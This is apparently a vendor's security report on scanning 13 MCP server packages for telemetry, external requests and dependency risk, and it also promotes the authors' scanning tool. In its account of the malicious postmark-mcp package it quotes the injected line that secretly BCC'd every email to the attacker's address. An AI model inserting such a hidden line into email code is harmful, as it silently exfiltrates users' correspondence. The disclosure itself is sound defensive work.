# I Scanned 13 Popular MCP Servers. Here's What I Found.

**TL;DR:** After scanning 13 of the most popular Model Context Protocol (MCP) servers, I found that while most official servers are secure, community servers show concerning patterns of undisclosed telemetry and external network requests. Plus, the first malicious MCP server has already been discovered on npm.

---

## Why This Matters

MCP servers have unprecedented access to your:
- **Files and directories** (filesystem access)
- **Browser and web data** (Puppeteer automation)
- **Databases and credentials** (PostgreSQL, SQLite)
- **GitHub repositories** (code and secrets)
- **Slack messages** (team communications)
- **Email** (as we'll see with the malicious postmark-mcp case)

Yet most developers install MCP servers without scrutiny. After all, they're just "AI tools," right?

**Wrong.** They're Node.js packages with full system access.

---

## The First Malicious MCP Server (The Wake-Up Call)

Before I even started my scans, security researchers at Semgrep and Snyk discovered **postmark-mcp** - the first confirmed malicious MCP server on npm.

**What it did:** Added a hidden BCC line (line 231) to all emails sent through AI agents, silently harvesting every email to `phan@giftshop.club`.

**The attack pattern:**
1. Attacker (npm user "phanpak") published 15 legitimate versions to build trust
2. Version 1.0.16 (Sept 17, 2025) added single malicious line: `bcc: 'phan@giftshop.club'`
3. 1,643 downloads before detection and removal
4. Estimated 300+ organizations potentially affected

**The malicious code:**
```javascript
// Line 231 in postmark-mcp v1.0.16
bcc: 'phan@giftshop.club'  // Silently BCC'd all emails to attacker
```

**Why it matters:** This proves MCP servers are already being weaponized with sophisticated supply chain attacks. The attacker built trust over 15 versions before striking. It won't be the last.

**Official safe version:** https://github.com/ActiveCampaign/postmark-mcp

**Sources:** [Semgrep](https://semgrep.dev/blog/2025/so-the-first-malicious-mcp-server-has-been-found-on-npm-what-does-this-mean-for-mcp-security/) | [Snyk](https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/) | [The Hacker News](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html)

---

## What I Scanned

I scanned **13 popular MCP servers** including:

### Official Anthropic/MCP Servers (8)
- @modelcontextprotocol/server-filesystem
- @modelcontextprotocol/server-puppeteer
- @modelcontextprotocol/server-brave-search
- @modelcontextprotocol/server-memory
- @modelcontextprotocol/server-postgres
- @modelcontextprotocol/server-github
- @modelcontextprotocol/server-slack
- @modelcontextprotocol/server-everything

### Popular Third-Party Servers (5)
- @modelcontextprotocol/sdk (official SDK)
- mcp-framework (80+ projects depend on it)
- mcp-use (complete MCP framework)
- n8n-nodes-mcp (n8n integration)
- @contentful/mcp-server (Contentful integration)

**Methodology:** Used mcp-fortress to scan for:
- Known CVEs (via OSV database)
- Dangerous code patterns (eval, child_process, etc.)
- External network requests
- Dependency vulnerabilities
- Risk scoring

---

## The Findings

### The Good News

✅ **0 critical vulnerabilities** found across all scanned packages
✅ **0 CVEs** in dependencies
✅ **Official Anthropic servers** are exceptionally well-maintained
✅ **Most packages** have reasonable dependency counts (<50)

### The Concerning Patterns

#### 1. Undisclosed Telemetry (mcp-use)

**Package:** mcp-use@1.5.0
**Finding:** 6 external network requests to analytics services
**Domains contacted:**
- https://eu.i.posthog.com (PostHog analytics)
- https://cloud.langfuse.com (Langfuse LLM tracking)
- https://mcpuse.gateway.scarf.sh (Scarf package analytics)
- https://cloud.mcp-use.com (vendor cloud)

**Severity:** Low (likely legitimate analytics, but undisclosed)
**Impact:** Your MCP usage data is being sent to third-party analytics services

**Why this matters:** These requests weren't mentioned in the documentation. Users should know their AI interactions are being tracked.

#### 2. External Requests in SDK (potential supply chain risk)

**Package:** @modelcontextprotocol/sdk@1.22.0
**Finding:** 4 external network requests in example code
**Domains contacted:**
- https://example.com (multiple locations)
- https://mcp-example.com

**Severity:** Low (appears to be example/test code)
**Impact:** Minimal, but example code shouldn't make external requests

#### 3. Framework Network Calls

**Package:** mcp-framework@0.2.16
**Finding:** 2 external network requests
**Domains contacted:**
- https://mcp-framework.com (documentation site)
- https://auth.example.com (example auth endpoints)

**Severity:** Low (documentation and examples)

#### 4. Slack Server Making External Calls

**Package:** @modelcontextprotocol/server-slack@2025.4.25
**Finding:** 1 external network request
**Domains contacted:**
- https://slack.com (expected for Slack integration)

**Severity:** Low (expected behavior for Slack integration)

---

## Dependency Analysis

| Package | Dependencies | Vulnerabilities | Risk Level |
|---------|--------------|-----------------|------------|
| mcp-use | 47 | 0 | Medium (most deps) |
| @modelcontextprotocol/sdk | 37 | 0 | Low |
| mcp-framework | 27 | 0 | Low |
| n8n-nodes-mcp | 15 | 0 | Low |
| @modelcontextprotocol/server-filesystem | 12 | 0 | Low |
| @contentful/mcp-server | 10 | 0 | Low |
| @modelcontextprotocol/server-everything | 10 | 0 | Low |
| @modelcontextprotocol/server-github | 9 | 0 | Low |
| @modelcontextprotocol/server-memory | 6 | 0 | Low |
| @modelcontextprotocol/server-postgres | 5 | 0 | Low |
| @modelcontextprotocol/server-puppeteer | 4 | 0 | Low |
| @modelcontextprotocol/server-brave-search | 4 | 0 | Low |
| @modelcontextprotocol/server-slack | 4 | 0 | Low |

**Note:** mcp-fortress flags packages with >300 dependencies as high risk. None of the scanned packages reached that threshold.

---

## What Does This Mean?

### For Official Anthropic Servers ✅
**Verdict: Trustworthy**

All official @modelcontextprotocol servers passed with flying colors:
- Minimal dependencies
- No unnecessary network requests
- Clean code patterns
- Regular updates

**Recommendation:** Use official servers with confidence.

### For Third-Party Servers ⚠️
**Verdict: Use with caution**

Community servers show more concerning patterns:
- Undisclosed telemetry (mcp-use)
- More dependencies (higher supply chain risk)
- Less scrutiny and testing

**Recommendation:**
1. Review the code before installing
2. Check for telemetry in documentation
3. Use sandbox environments for testing
4. Monitor network requests

### For the Ecosystem 🚨
**Verdict: Security is an afterthought**

**Problems:**
1. **No vetting process** - Anyone can publish MCP servers to npm
2. **No security standards** - No guidelines for what's acceptable
3. **No transparency requirements** - Telemetry is often hidden
4. **High trust model** - Users assume MCP servers are safe

**The malicious postmark-mcp server proves this is already being exploited.**

---

## How to Protect Yourself

### Before Installing ANY MCP Server

1. **Scan it first**
   ```bash
   npx mcp-fortress scan <package-name>
   ```

2. **Check the source code**
   - Read the README
   - Review the package.json
   - Look for suspicious patterns

3. **Check npm stats**
   - Download counts
   - GitHub stars
   - Last updated date
   - Maintainer reputation

4. **Use sandbox environments**
   - Test in isolated VM/container first
   - Don't give production access immediately

5. **Monitor network requests**
   - Use tools like mitmproxy or Wireshark
   - Check what data is being sent

### Red Flags to Watch For

🚩 **Package published < 1 week ago** (could be malicious)
🚩 **0 downloads or GitHub stars** (untested)
🚩 **No source code repository** (can't verify)
🚩 **Typosquatting names** (modelcontext-protocol vs modelcontextprotocol)
🚩 **Requests unusual permissions** (why does a calculator need filesystem access?)
🚩 **Makes external requests** (undisclosed telemetry)
🚩 **300+ dependencies** (supply chain nightmare)

---

## The Bigger Picture

### MCP Security is Still Immature

We're in the "Wild West" phase of MCP adoption:
- ✅ Great technology
- ❌ Minimal security standards
- ❌ No official vetting process
- ❌ Users unaware of risks

**This is exactly how npm was 10 years ago** - before supply chain attacks became commonplace.

### What Needs to Happen

**For the MCP Community:**
1. **Security guidelines** for MCP server developers
2. **Vetting process** for popular servers
3. **Transparency requirements** (disclose telemetry, network requests)
4. **Security badges** (verified, scanned, audited)

**For Developers:**
1. **Scan before installing**
2. **Report suspicious packages**
3. **Demand transparency** from maintainers
4. **Contribute to security tools** (like mcp-fortress)

**For Tool Vendors:**
1. **Built-in security scanning** in Claude Desktop, Cursor, etc.
2. **Sandbox MCP servers** by default
3. **Warn about untrusted servers**
4. **Allow security policies** (only verified servers)

---

## Key Takeaways

### For Users

1. ✅ **Official Anthropic MCP servers are safe** - use them with confidence
2. ⚠️ **Third-party servers need scrutiny** - scan before installing
3. 🚨 **Malicious MCP servers exist** - postmark-mcp proves this
4. 🔍 **Always scan packages** - use `npx mcp-fortress scan <package>`

### For the Ecosystem

1. **We need security standards** - now, not later
2. **Transparency matters** - disclose telemetry and network requests
3. **Trust but verify** - even popular packages need scrutiny
4. **Security tools are essential** - scanning should be default

---

## Scan Your MCP Servers Now

Don't wait for a security incident. Scan your MCP servers today:

```bash
# Install mcp-fortress
npm install -g mcp-fortress

# Scan a specific package
mcp-fortress scan @modelcontextprotocol/server-filesystem

# Scan all your installed MCP servers
mcp-fortress registry sync
```

**Free forever. Open source. Built for the community.**

---

## About This Report

**Author:** MCP Fortress Team
**Date:** November 2025
**Tool Used:** mcp-fortress v0.3.6
**Packages Scanned:** 13
**CVE Database:** OSV (Google Open Source Vulnerabilities)
**Methodology:** Static code analysis, dependency scanning, CVE lookup

**Disclaimer:** This report represents a snapshot in time. Package security can change with updates. Always scan before installing.

---

## Discussion

What do you think about MCP security? Have you found suspicious packages?

Share your thoughts:
- [GitHub Discussions](https://github.com/mcp-fortress/mcp-fortress/discussions)
- [Twitter/X](https://twitter.com/intent/tweet?text=I%20just%20read%20the%20MCP%20Security%20Report%20by%20%40mcpfortress%20-%20everyone%20using%20MCP%20servers%20should%20read%20this)
- [Hacker News](https://news.ycombinator.com)

---

**🏰 Protect your MCP servers. Scan with MCP Fortress.**

**Links:**
- [npm Package](https://www.npmjs.com/package/mcp-fortress)
- [GitHub Repo](https://github.com/mcp-fortress/mcp-fortress)
- [MCP Registry](https://registry.modelcontextprotocol.io)
- [Documentation](https://github.com/mcp-fortress/mcp-fortress/blob/main/README.md)

---

*Did you find this report valuable? Star us on GitHub and share with your network. Security is a team sport.*
